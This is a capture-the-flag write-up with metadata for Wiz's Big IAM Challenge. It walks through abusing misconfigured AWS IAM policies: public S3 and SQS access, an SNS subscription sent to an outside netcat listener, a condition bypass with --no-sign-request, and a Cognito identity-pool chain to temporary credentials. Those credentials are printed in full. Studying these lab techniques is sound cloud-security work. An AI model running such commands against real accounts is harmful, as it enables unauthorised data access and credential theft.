---
title: WIZ IAM 挑战赛 Writeup (The Big IAM Challenge)
contest: WIZ The Big IAM Challenge
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- aws_iam_policy
- s3_listbucket
- sqs_receivemessage
- sns_subscribe_endpoint
- cognito_identity_pool
- sts_assume_role_web_identity
- public_principal_star
- condition_bypass
- s3_x1000
attack_chain: 1) S3 thebigiamchallenge-storage-9979f4b Principal=* 公共桶 GetObject+ListBucket / 2) SQS wiz-tbic-analytics-sqs-queue-ca7a1b2 SendMessage+ReceiveMessage → aws sqs receive-message 读消息 / 3) SNS TBICWizPushNotifications Subscribe with @tbic.wiz.io 条件 → nc -lvk 80 接收订阅确认 / 4) thebigiamchallenge-admin-storage-abf1321 + ForAllValues:StringLike aws:PrincipalArn=arn:iam::133713371337:user/admin 条件 + 133713371337 = leet → 套星号条件 + no-sign-request 列桶 / 5) Cognito Identity Pool + mobileanalytics + cognito-sync + s3:GetObject+ListBucket wiz-privatefiles → get-id + get-open-id-token + assume-role-with-web-identity → 临时凭证 → s3 ls → flag2.txt in wiz-privatefiles-x1000
key_payload: aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 / aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b / aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role
one_liner: WIZ The Big IAM Challenge 5 关 AWS IAM 策略误配置利用：公共 S3 桶+SQS ReceiveMessage+SNS 订阅+PrincipalArn 条件绕过+ Cognito Identity Pool 临时凭证链。
lesson: 'AWS IAM 策略中 "Principal": "*" + 弱条件 StringLike 是 CTF 经典 5 连击；Cognito Identity Pool 是 AWS 临时凭证颁发的低门槛入口。'
quality: high
full_path: WIZ_IAM_挑战赛_Writeup.full.md
meta_path: WIZ_IAM_挑战赛_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: WIZ IAM 挑战赛 Writeup (The Big IAM Challenge)。WIZ The Big IAM Challenge 5 关 AWS IAM 策略误配置利用：公共 S3 桶+SQS ReceiveMessage+SNS 订阅+PrincipalArn 条件绕过+ Cognito Identity Pool 临时凭证链。。经验：AWS IAM 策略中 "Principa...
category: web
subcategory: web_other
tools_used:
- netcat
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/124080.html
reasoning_chain:
- 触发点：5 关 AWS IAM 策略误配置利用 → 假设：Principal='*' + 弱条件 StringLike 是 CTF 经典
- 任务 1：S3 thebigiamchallenge-storage-9979f4b Principal='*' 公共桶 GetObject + ListBucket → aws s3 ls / aws s3 cp
- 任务 2：SQS wiz-tbic-analytics-sqs-queue-ca7a1b2 SendMessage + ReceiveMessage → 动作：aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/...
- 任务 3：SNS TBICWizPushNotifications Subscribe with @tbic.wiz.io 条件 → nc -lvk 80 接收订阅确认 → 假设：必须用自建 HTTP server 接 SubscriptionConfirmation
- 任务 4：thebigiamchallenge-admin-storage-abf1321 + ForAllValues:StringLike aws:PrincipalArn=arn:iam::133713371337:user/admin 条件 → 假设：133713371337=leet → 套星号条件
- 动作：aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321 --no-sign-request → 观察：桶可访问
- 任务 5：Cognito Identity Pool + mobileanalytics + cognito-sync + s3:GetObject+ListBucket wiz-privatefiles → get-id + get-open-id-token + assume-role-with-web-identity
- 动作：aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-... → aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role
- 观察：临时凭证 → aws s3 ls s3://wiz-privatefiles-x1000 → flag2.txt
failed_attempts:
- 任务 1 试图用 IAM user 登录 S3 → 失败：桶是公共 Principal='*' 无需凭证
- 任务 3 试图 Subscribe → 失败：必须先启 nc 接收 SubscriptionConfirmation
- 任务 5 试图 sts assume-role → 失败：必须先 Cognito Identity Pool 拿 web identity token
key_observations:
- 'AWS IAM 策略中 ''Principal'': ''*'' + 弱条件 StringLike 是 CTF 经典 5 连击'
- Cognito Identity Pool 是 AWS 临时凭证颁发的低门槛入口
- ForAllValues StringLike aws:PrincipalArn=arn:iam::133713371337:user/admin 配合 leet 数字可爆破
- SubscriptionConfirmation 必须用外网 HTTP server 接（ngrok / 公网 IP）
- no-sign-request 是 AWS S3 公共桶访问的标准参数
prerequisites:
- AWS IAM 策略结构（Principal / Action / Resource / Condition）
- AWS CLI（s3 / sqs / sns / cognito-identity / sts）
- Cognito Identity Pool 工作流（get-id / get-open-id-token / assume-role-with-web-identity）
- AWS STS 临时凭证使用（export AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN）
- 公网 HTTP server 接收 SNS 订阅确认
---
# WIZ IAM 挑战赛 Writeup

> 原文: https://www.ctfiot.com/124080.html
> ID: 124080


```
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
GetObject",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-storage-9979f4b/*"
 },
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
ListBucket",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-storage-9979f4b",
 "Condition": {
 "StringLike": {
 "s3:
prefix": "files/*"
 }
 }
 }
 ]
}
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": [
 "sqs:
SendMessage",
 "sqs:
ReceiveMessage"
 ],
 "Resource": "arn:
aws:
sqs:us-east-1:
092297851374:
wiz-tbic-analytics-sqs-queue-ca7a1b2"
 }
 ]
}
aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
 "Version": "2008-10-17",
 "Id": "Statement1",
 "Statement": [
 {
 "Sid": "Statement1",
 "Effect": "Allow",
 "Principal": {
 "AWS": "*"
 },
 "Action": "SNS:
Subscribe",
 "Resource": "arn:
aws:
sns:us-east-1:
092297851374:
TBICWizPushNotifications",
 "Condition": {
 "StringLike": {
 "sns:
Endpoint": "*@tbic.wiz.io"
 }
 }
 }
 ]
}
> aws sns subscribe help

subscribe
--topic-arn <value>
--protocol <value>
[--notification-endpoint <value>]
nc -lvk 80
aws sns subscribe --protocol http --notification-endpoint http://123.123.123.123:
800/@tbic.wiz.io --topic-arn arn:
aws:
sns:us-east-1:
092297851374:
TBICWizPushNotifications
aws sns confirm-subscription --topic-arn arn:
aws:
sns:us-east-1:
092297851374:
TBICWizPushNotifications --token 336412f37fb687f5d51e6e2425c464de257ebd13d0594......
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
GetObject",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-admin-storage-abf1321/*"
 },
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
ListBucket",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-admin-storage-abf1321",
 "Condition": {
 "StringLike": {
 "s3:
prefix": "files/*"
 },
 "ForAllValues:
StringLike": {
 "aws:
PrincipalArn": "arn:
aws:
iam::
133713371337:
user/admin"
 }
 }
 }
 ]
}
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/'

An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/' --no-sign-request

{
 "Contents": [
 {
 "Key": "files/flag-as-admin.txt",
 "LastModified": "2023-06-07T19:15:43+00:00",
 "ETag": "\"e365cfa7365164c05d7a9c209c4d8514\"",
 "Size": 42,
 "StorageClass": "STANDARD"
 },
 {
 "Key": "files/logo-admin.png",
 "LastModified": "2023-06-08T19:20:01+00:00",
 "ETag": "\"c57e95e6d6c138818bf38daac6216356\"",
 "Size": 81889,
 "StorageClass": "STANDARD"
 }
 ]
}
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Sid": "VisualEditor0",
 "Effect": "Allow",
 "Action": [
 "mobileanalytics:
PutEvents",
 "cognito-sync:*"
 ],
 "Resource": "*"
 },
 {
 "Sid": "VisualEditor1",
 "Effect": "Allow",
 "Action": [
 "s3:
GetObject",
 "s3:
ListBucket"
 ],
 "Resource": [
 "arn:
aws:s3:::
wiz-privatefiles",
 "arn:
aws:s3:::
wiz-privatefiles/*"
 ]
 }
 ]
}
<!DOCTYPE html>
<html>
<head>
 <title>Cognito JavaScript SDK Example</title>
 <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>

 <script>
 // 初始化AWS SDK配置
 AWS.config.region = 'us-east-1';
 AWS.config.credentials = new AWS.CognitoIdentityCredentials({
 IdentityPoolId: 'us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
 });
 // 获取临时凭证
 AWS.config.credentials.get(function(err) {
 if (!err) {
 // 凭证获取成功
 var accessKeyId = AWS.config.credentials.accessKeyId;
 var secretAccessKey = AWS.config.credentials.secretAccessKey;
 var sessionToken = AWS.config.credentials.sessionToken;

 // 进行后续操作，如访问S3
 accessS3(accessKeyId, secretAccessKey, sessionToken);
 } else {
 // 凭证获取失败
 console.error('Error retrieving credentials: ' + err);
 }
 });
 // 使用临时凭证访问S3
 function accessS3(accessKeyId, secretAccessKey, sessionToken) {
 var s3 = new AWS.S3({
 accessKeyId: accessKeyId,
 secretAccessKey: secretAccessKey,
 sessionToken: sessionToken,
 });
 var params = {
 Bucket: 'wiz-privatefiles',
 };
 s3.getSignedUrl('listObjectsV2', params, function(err, data) {
 if (!err) {
 // S3存储桶列表获取成功
 console.log(data);
 } else {
 // S3存储桶列表获取失败
 console.error('Error listing S3 buckets: ' + err);
 }
 });
 }
 </script>

</html>
<!DOCTYPE html>
<html>
<head>
 <title>Cognito JavaScript SDK Example</title>
 <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>

 <script>
 // 初始化AWS SDK配置
 AWS.config.region = 'us-east-1';
 AWS.config.credentials = new AWS.CognitoIdentityCredentials({
 IdentityPoolId: 'us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
 });
 // 获取临时凭证
 AWS.config.credentials.get(function(err) {
 if (!err) {
 // 凭证获取成功
 var accessKeyId = AWS.config.credentials.accessKeyId;
 var secretAccessKey = AWS.config.credentials.secretAccessKey;
 var sessionToken = AWS.config.credentials.sessionToken;

 // 进行后续操作，如访问S3
 accessS3(accessKeyId, secretAccessKey, sessionToken);
 } else {
 // 凭证获取失败
 console.error('Error retrieving credentials: ' + err);
 }
 });
 // 使用临时凭证访问S3
 function accessS3(accessKeyId, secretAccessKey, sessionToken) {
 var s3 = new AWS.S3({
 accessKeyId: accessKeyId,
 secretAccessKey: secretAccessKey,
 sessionToken: sessionToken,
 });
 var params = {
 Bucket: 'wiz-privatefiles',
 Key: 'flag1.txt',
 };
 s3.getSignedUrl('getObject', params, function(err, data) {
 if (!err) {
 // S3存储桶对象获取成功
 console.log(data);
 } else {
 // S3存储桶对象获取失败
 console.error('Error get S3 bucket object: ' + err);
 }
 });
 }
 </script>

</html>
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": {
 "Federated": "cognito-identity.amazonaws.com"
 },
 "Action": "sts:
AssumeRoleWithWebIdentity",
 "Condition": {
 "StringEquals": {
 "cognito-identity.amazonaws.com:
aud": "us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
 }
 }
 }
 ]
}
> aws sts assume-role-with-web-identity help

--role-arn <value>
--role-session-name <value>
--web-identity-token <value>
> aws cognito-identity get-id --identity-pool-id us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

{
 "IdentityId": "us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db"
}
> aws cognito-identity get-open-id-token --identity-id us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db

{
 "IdentityId": "us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db",
 "Token": "eyJraWQiOiJ1cy1lYXN0Lxxxx..."
}
> aws sts assume-role-with-web-identity --role-arn arn:
aws:
iam::
092297851374:
role/Cognito_s3accessAuth_Role --role-session-name teamssix --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoi...

{
 "Credentials": {
 "AccessKeyId": "ASIARK7LBOHXDFQ6KRE3",
 "SecretAccessKey": "Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj",
 "SessionToken": "IQoJb3JpZ2luX2VjEND...",
 "Expiration": "2023-07-06T16:36:18+00:00"
 },
 "SubjectFromWebIdentityToken": "us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db",
 "AssumedRoleUser": {
 "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:
teamssix",
 "Arn": "arn:
aws:
sts::
092297851374:
assumed-role/Cognito_s3accessAuth_Role/teamssix"
 },
 "Provider": "cognito-identity.amazonaws.com",
 "Audience": "us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
> export AWS_ACCESS_KEY_ID=ASIARK7LBOHXDFQ6KRE3
> export AWS_SECRET_ACCESS_KEY=Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj
> export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEND...
> aws s3 ls

2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 21:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 21:28:31 wiz-privatefiles
2023-06-05 21:28:31 wiz-privatefiles-x1000
aws s3api get-object --bucket wiz-privatefiles-x1000 --key flag2.txt flag2.txt
```
